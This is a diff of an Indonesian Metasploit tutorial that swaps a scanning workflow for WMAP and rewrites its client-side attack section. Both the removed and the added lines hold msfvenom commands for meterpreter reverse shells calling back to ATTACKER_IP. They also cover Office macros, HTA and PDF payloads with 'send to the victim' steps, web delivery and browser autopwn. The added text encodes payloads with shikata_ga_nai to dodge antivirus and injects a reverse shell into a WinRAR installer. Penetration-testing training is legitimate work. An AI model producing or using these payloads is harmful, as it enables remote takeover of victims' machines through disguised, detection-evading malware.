@@ -426,27 +426,26 @@ services
 vulns
 ```
 
-### Vulnerability Scanning Workflow
+### Vulnerability Scanning dengan WMAP
 
 ```bash
 # 1. Setup workspace
-workspace -a target_scan
+workspace -a Web_scanning
+setg <IP TARGET>
 
-# 2. Scan dengan nmap (hasil masuk database)
-db_nmap -sV -sC -O 192.168.1.0/24
+# 2. Load Wmap
+load wmap
 
-# 3. Lihat host & service yang ditemukan
-hosts
+# 3. Atur Ip target
+wmap_sites -a <IP TARGET>
+
+# 4. Atur URL target
+wmap_target -t http://<TARGET>/xxx
 services
 
-# 4. Scan vulnerability berdasarkan service yang ditemukan
-# Misalnya ada SMB port 445 → scan EternalBlue
-use auxiliary/scanner/smb/smb_ms17_010
-set RHOSTS file:/tmp/smb_hosts.txt
-run
+# 5. Running
+wmap_run -t
 
-# 5. Lihat hasil
-vulns
 ```
 
 ---
@@ -457,101 +456,47 @@ vulns
 
 Client-side attacks menargetkan **aplikasi di sisi client** (browser, Office, PDF reader) bukan server. Target harus **membuka file atau mengklik link** yang berbahaya.
 
-Skenario umum:
-- Korban membuka dokumen Word/Excel berbahaya
-- Korban mengklik link yang mengarah ke exploit
-- Korban membuka file PDF berbahaya
-
-### Msfvenom untuk Client-Side Payload
+### Generating Payloads With Msfvenom
 
 ```bash
 # ─── WINDOWS EXECUTABLE ────────────────────────────────────
 
 # Basic reverse shell .exe
-msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f exe -o payload.exe
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f exe > payloadx64.exe
+msfvenom -a x86 -p windows/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f exe > payloadx86.exe
 
-# 64-bit
-msfvenom -p windows/x64/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f exe -o payload64.exe
+# ─── LINUX EXECUTABLE ──────────────────────────────────────
 
-# ─── OFFICE MACRO ──────────────────────────────────────────
-
-# Generate VBA macro untuk dokumen Office
-msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f vba -o macro.vba
-
-# Cara pakai:
-# 1. Buka Word/Excel → Developer → Visual Basic
-# 2. Paste isi macro.vba
-# 3. Simpan sebagai .docm atau .xlsm
-# 4. Kirim ke korban
-
-# ─── HTA (HTML Application) ────────────────────────────────
-
-msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f hta-psh -o payload.hta
-
-# Hosting di web server
-cp payload.hta /var/www/html/
-service apache2 start
-# Kirim link ke korban: http://ATTACKER_IP/payload.hta
-
-# ─── POWERSHELL ────────────────────────────────────────────
-
-msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f psh -o payload.ps1
-
-# ─── PDF ───────────────────────────────────────────────────
-
-msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f pdf -o payload.pdf
+# Basic reverse shell
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > payloadx86
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > payloadx64
 ```
 
-### Handler untuk Client-Side Attack
-
-Selalu setup listener sebelum mengirim payload ke korban:
+### Encoding Payloads with Msfvenom
 
 ```bash
-use multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST ATTACKER_IP
-set LPORT 4444
-run -j    # jalankan di background sebagai job
+# List Encoding
+msfvenom --list encoders
+
+# Mengunakan encoder shikata_ga_nai dengan iterasi 10
+
+Iterasi memungkinkan untuk tidak terdeteksi antivirus
+
+# ─── WINDOWS EXECUTABLE ────────────────────────────────────
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe > encodingx86.exe
+
+# ─── LINUX EXECUTABLE ────────────────────────────────────
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -i 10 -e x86/shikata_ga_nai -f elf > encodingx86
 ```
 
-### Web Delivery Module
-
-Module ini meng-host payload di web server MSF dan generate perintah untuk dijalankan di target.
+### Injecting Payloads Into Windows Portable Executables
 
 ```bash
-use exploit/multi/script/web_delivery
-set TARGET 2             # 0=PHP, 1=Python, 2=PowerShell, 3=Regsvr32
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST ATTACKER_IP
-set LPORT 4444
-run
+# ─── WINDOWS EXECUTABLE ────────────────────────────────────
 
-# MSF akan generate perintah seperti:
-# powershell.exe -nop -w hidden -e JABzAD0ATgBlAH...
-# Jalankan perintah ini di target (via RCE, social engineering, dll)
-```
-
-### Browser Exploitation
-
-```bash
-# BeEF integration (browser exploitation)
-use auxiliary/server/browser_autopwn2
-set LHOST ATTACKER_IP
-set URIPATH /
-run
-# Kirim URL ke korban → browser otomatis dieksploitasi
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -i 10 -x ~/Downloads/wrar602.exe -e x86/shikata_ga_nai -f exe > winrar.exe
 ```
 
 ---
